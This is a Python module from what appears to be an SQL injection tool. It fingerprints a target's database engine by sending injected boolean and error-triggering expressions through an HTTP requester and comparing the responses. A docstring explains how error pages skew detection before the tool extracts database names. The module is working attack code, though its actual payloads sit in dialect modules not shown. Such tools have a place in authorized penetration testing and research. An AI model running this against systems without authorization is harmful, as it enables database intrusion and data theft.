"""DBMS fingerprinting"""
from dbms.mysql import MySQLDialect
from dbms.mssql import MSSQLDialect
from dbms.oracle import OracleDialect
from dbms.postgresql import PostgreSQLDialect
from dbms.sqlite import SQLiteDialect


DIALECTS = {
    "mysql":      MySQLDialect,
    "mssql":      MSSQLDialect,
    "oracle":     OracleDialect,
    "postgresql": PostgreSQLDialect,
    "sqlite":     SQLiteDialect,
}

# Markers used to judge "whether this response is a backend/database error page" (used only for veto; prefer missing a judgment over a false positive).
ERROR_MARKERS = (
    "syntax error", "no such", "unknown column", "unknown table",
    "unrecognized", "sqlstate", "ora-", "microsoft ole db",
    "unclosed quotation", "invalid json", "error:", "warning: ",
    "fatal error", "traceback", "exception", "denied",
)


class Fingerprinter:
    def __init__(self, requester, detector, log=None):
        self.req = requester
        self.det = detector
        self.log = log
        self.dbms = None
        self.version = None
        self.dialect_cls = None

    def force(self, name):
        name = name.lower()
        if name in DIALECTS:
            self.dbms = name
            self.dialect_cls = DIALECTS[name]
            print(f"[+] Forced DBMS: {name}")
        else:
            print(f"[-] Unknown DBMS: {name}, falling back to mysql")
            self.dbms = "mysql"
            self.dialect_cls = MySQLDialect

    # ---------------- Boolean fingerprinting: must exclude "error pages" ----------------
    def _looks_like_error(self, r):
        """Whether the response looks like an error page. Returns True / False, or None when no response is available."""
        if r["status"] == -1:
            return None
        if r["status"] >= 400:
            return True
        low = r["text"].lower()
        return any(m in low for m in ERROR_MARKERS)

    def _bool_match(self, expr):
        """The hit condition for boolean fingerprinting: the expression holds **and** this response does not look like an error page.

        Why error pages must be excluded: is_true() judges by "which side (true/false) the response length falls on",
        and an error page is usually longer than a normal page —— so tables / functions that **simply do not exist**
        on this DBMS (e.g. running information_schema.tables on SQLite) return a full page of long text,
        which is_true misjudges as "the expression holds". The consequence is that the first dialect tested in the map always matches:
        a SQLite target is misidentified as MySQL, then DATABASE()/CONCAT and the like all error out,
        showing up as "closing-style detection is fine and fingerprinting also 'succeeds', but as soon as you fetch the database name everything is empty".
        """
        r = self.req.send(self.det.build(f"1 AND ({expr})"))
        if self._looks_like_error(r) is not False:
            return False
        return self.det.is_true(expr) is True

    def detect(self):
        print("[*] Fingerprinting...")
        for name, cls in DIALECTS.items():
            d = cls()
            for payload in d.error_fingerprints():
                r = self.req.send(self.det.build(f"1 AND ({payload})"))
                if r["status"] == -1:
                    continue
                text = r["text"].lower()
                for kw in d.error_keywords():
                    if kw.lower() in text:
                        self.dbms = name
                        self.dialect_cls = cls
                        print(f"[+] DBMS: {name} (keyword '{kw}')")
                        return
        for name, cls in DIALECTS.items():
            d = cls()
            for expr in d.boolean_fingerprints():
                if self._bool_match(expr):
                    self.dbms = name
                    self.dialect_cls = cls
                    print(f"[+] DBMS: {name} (boolean fingerprint)")
                    return
        print("[!] Unable to identify DBMS, defaulting to MySQL")
        self.dbms = "mysql"
        self.dialect_cls = MySQLDialect

    def get_dialect(self):
        if not self.dialect_cls:
            self.dialect_cls = MySQLDialect
        return self.dialect_cls()

    def print_info(self):
        print("=" * 50)
        print(f"  DBMS   : {self.dbms}")
        print(f"  Dialect: {self.dialect_cls.__name__ if self.dialect_cls else 'N/A'}")
        print("=" * 50)